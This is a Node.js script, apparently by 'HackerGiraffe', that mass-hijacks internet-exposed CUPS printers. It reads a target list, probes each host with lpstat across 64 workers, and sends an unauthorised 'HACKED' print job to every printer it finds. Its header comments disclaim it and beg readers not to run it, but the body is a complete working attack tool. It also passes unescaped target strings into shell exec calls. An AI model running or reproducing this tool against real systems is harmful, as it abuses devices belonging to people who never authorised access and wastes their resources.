//FOR RESEARCH PURPOSES ONLY.
//YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS - DO NOT RUN THIS ON PRINTERS YOU DO NOT HAVE AUTHORIZATION TO PRINT ON
//I AM SERIOUS. DO NOT BE A SKID AND LEAVE PEOPLE'S STUFF ALONE. WE ALREADY WASTED ENOUGH PAPER AND INK.
//I am serious. Please. Don't try to have your own 5 minutes of fame. No one will think you are 'cool'. You will be a copycat.
//Try to learn and build your own programs. Be ethical. Be better than me.
//I am seriously asking you to leave people's printers alone, we made our point.
//Thank you, HackerGiraffe

const chalk = require('chalk');
const fs = require('fs');
const cluster = require('cluster');

//Commented this out because what if I want to go faster than 8 CPUs
// const numCPUs = require('os').cpus().length;

//Number of threads
const numCPUs = 64;

//Exec
const { exec } = require('child_process');

//Counters
let count = 0;
let hacked = 1;

//Open file for reading
let array = fs.readFileSync('./potential_cups_bros.txt').toString().split("\n");

//Stolen function from StackOverflow
function splitUp(arr, n) {
    var rest = arr.length % n, // how much to divide
        restUsed = rest, // to keep track of the division over the elements
        partLength = Math.floor(arr.length / n),
        result = [];

    for (let i = 0; i < arr.length; i += partLength) {
        var end = partLength + i,
            add = false;

        if (rest !== 0 && restUsed) { // should add one element for the division
            end++;
            restUsed--; // we've used one division element now
            add = true;
        }

        result.push(arr.slice(i, end)); // part of the array

        if (add) {
            i++; // also increment i in the case we added an extra element for division
        }
    }

    return result;
}

var arrays = splitUp(array, numCPUs);

//Stolen from nodejs docs lol
if (cluster.isMaster) {
    console.log(chalk.yellow(`Master ${process.pid} is running`));

    //Counter
    var start = Date.now();

    // Fork workers.
    for (let i = 0; i < numCPUs; i++) {
        var worker = cluster.fork();
        worker.send(arrays[i]);

        worker.on('message', function (msg) {
            hacked += msg.hacked;
            count += msg.count;
            console.log(chalk.magenta(`Progress: ${count}/${array.length} [${((count / array.length) * 100).toFixed(5)}%] Hacked: ${hacked}/${array.length} [${((hacked / array.length) * 100).toFixed(5)}%]`));
        });
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`worker ${worker.process.pid} died`);
    });



    cluster.on('exit', function (worker) {
        // When the master has no more workers alive it
        // prints the elapsed time and then kills itself
        if (Object.keys(cluster.workers).length === 0) {
            console.log('Every worker has finished its job.');
            console.log('Elapsed Time: ' + (Date.now() - start) + 'ms');
            process.exit(1);
        }
    });

} else {
    console.log(chalk.blue(`Worker ${process.pid} started`));

    async function loopTargets(targets) {
        let counter = 0;
        for (const target in targets) {
            await runAttack(targets[target]);
            process.send({ count: 1, hacked: 0 });
            exec(`sed -i '' "/${targets[target]}/d" ./potential_cups_bros.txt`)
        }
    }

    async function runAttack(target) {
        return new Promise(resolve => {
            //Check if it is a valid CUPS server
            exec(`timeout lpstat -h "${target}/version=1.1" -a`, (err, stdout, stderr) => {
                if (err) {
                    console.log(chalk.red(`${target} is not a valid CUPS server.`));
                    resolve();
                } else {

                    //Count number of printers connected
                    let printers = stdout.split('\n').map((item) => {
                        return item.split(' ')[0];
                    });
                    printers.pop(); //Remove empty part

                    //If no printers, just skip
                    if (printers.length === 0) {
                        console.log(chalk.yellow(`${target} has no printers. Skipping...`));
                        resolve();
                    } else {
                        console.log(chalk.green(`${target} is a valid CUPS server with ${printers.length} printer(s)!`))

                        //Who made this a thing. Why.
                        for (const printer in printers) {
                            //Change HACKED number
                            exec(`cat ./message.txt | sed "s/PRINTERNOHERE/${hacked}/g" > ./tmp.txt`);

                            //THE MAGIC OF LPD PRINTING
                            exec(`timeout 120 lpr -H "${target}" -P ${printers[printer]} -o job-priority=100 -o fit-to-page  -U "anon" -C "HACKED" ./tmp.txt`, (err) => {
                                if (err) {
                                    console.log(chalk.red(`Failed to print to ${target}/${printers[printer]}.`))
                                } else {
                                    console.log(chalk.green.bold(`Printed successfully to ${target}/${printers[printer]}!`))
                                    process.send({ count: 0, hacked: 1 });
                                }
                            })
                        }

                        resolve();
                    }

                }
            })
        })
    }

    process.on('message', function (targets) {
        console.log(chalk.green.bold(`Worker ${process.pid} recieved ${targets.length} targets.`))
        loopTargets(targets);
    })
}
